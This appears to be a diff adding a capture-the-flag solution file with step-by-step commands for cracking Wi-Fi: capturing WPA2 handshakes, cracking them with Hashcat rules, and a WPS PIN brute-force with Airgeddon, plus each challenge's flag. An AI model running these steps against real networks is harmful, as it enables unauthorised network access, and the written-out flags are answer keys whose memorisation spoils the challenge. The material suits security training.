@@ -1,0 +1,104 @@
+##############################
+Challenge 1: WPA2 Pawshake Capture
+##############################
+
+1. Install required tools
+   • Update package list:
+     sudo apt-get update
+   • Install Hashcat, hcxtools and Aircrack-NG:
+     sudo apt-get install hashcat hcxtools aircrack-ng
+
+2. Prepare your WiFi adapter
+   • Plug in your injection-capable USB WiFi adapter.
+   • Verify it appears (e.g. `iwconfig` → look for wlan0).
+
+3. Enable monitor mode on Channel 1
+   • Stop conflicting services:
+     sudo airmon-ng check kill  
+   • Start monitor mode pinned to channel 1:
+     sudo airmon-ng start wlan0 1  
+   • Confirm your monitor interface (e.g. wlan0mon):  
+     iwconfig
+
+4. Capture the WPA2 handshake with Airgeddon
+   • Launch:
+     sudo airgeddon  
+   • Select your monitor interface (wlan0mon).  
+   • Choose “Handshake Sniffer” → “Capture WPA Handshake.”  
+   • Target SSID: Catnip_Cafe (Channel 1).  
+   • Wait until you see “WPA Handshake   Catnip_Cafe.”
+
+5. Convert the .cap to Hashcat’s .22000 format
+   sudo hcxpcapngtool -o handshake.22000 Catnip_Cafe-01.cap
+
+6. Verify the hash file
+   ls -lh handshake.22000
+
+7. Crack with Hashcat
+   hashcat -m 22000 handshake.22000 /path/to/wordlist.lst \
+     -r /usr/share/hashcat/rules/d3ad0ne.rule \
+     --status --status-timer=10
+
+8. Show the recovered passphrase
+   hashcat --show -m 22000 handshake.22000 /path/to/wordlist.lst
+
+9. Submit the flag
+   TrojanCTF{Recovered_Passphrase}
+
+
+##############################
+Challenge 2: Rainbow Hashcat Rampage
+##############################
+
+1. (Re)enable monitor mode on Channel 1
+   sudo airmon-ng check kill  
+   sudo airmon-ng start wlan0 1  
+   iwconfig        # confirm wlan0mon
+
+2. Capture the handshake
+   sudo airgeddon  
+   → Select wlan0mon → Handshake Sniffer  
+   → Target SSID: RainbowCat (Channel 1)  
+   → Wait for “WPA Handshake   RainbowCat”
+
+3. Convert the .cap to .22000
+   sudo hcxpcapngtool -o rainbow.22000 RainbowCat-01.cap
+
+4. Verify the hash file
+   ls -lh rainbow.22000
+
+5. Crack with Hashcat using d3ad0ne.rule
+   hashcat -m 22000 rainbow.22000 old-passwords.txt \
+     -r /usr/share/hashcat/rules/d3ad0ne.rule \
+     --status --status-timer=10
+
+   • `old-passwords.txt` contains prior passwords (e.g. “clawtastic”)  
+   • The rule toggles case and appends digits → recovers `Clawtastic1`
+
+6. Display the cracked key
+   hashcat --show -m 22000 rainbow.22000 kitten.lst
+
+7. Submit the flag
+   TrojanCTF{Clawtastic1}
+
+
+##############################
+Challenge 3: WPS PIN Pry
+##############################
+
+1. Enable monitor mode on Channel 1
+   sudo airmon-ng check kill  
+   sudo airmon-ng start wlan0 1  
+   iwconfig
+
+2. Launch Airgeddon’s WPS attack
+   sudo airgeddon  
+   → Select wlan0mon → “WPS Attack” → “Auto-PIN Attack”  
+   → Target SSID: MouseTrap01
+
+3. Wait for PIN & passphrase
+   • Airgeddon will cycle through PINs (Reaver/Bully).  
+   • Upon success you’ll see the WPA2 PSK (e.g. `wPSM30wM3ow_1337!`).
+
+4. Submit the flag
+   TrojanCTF{wPSM30wM3ow_1337!}
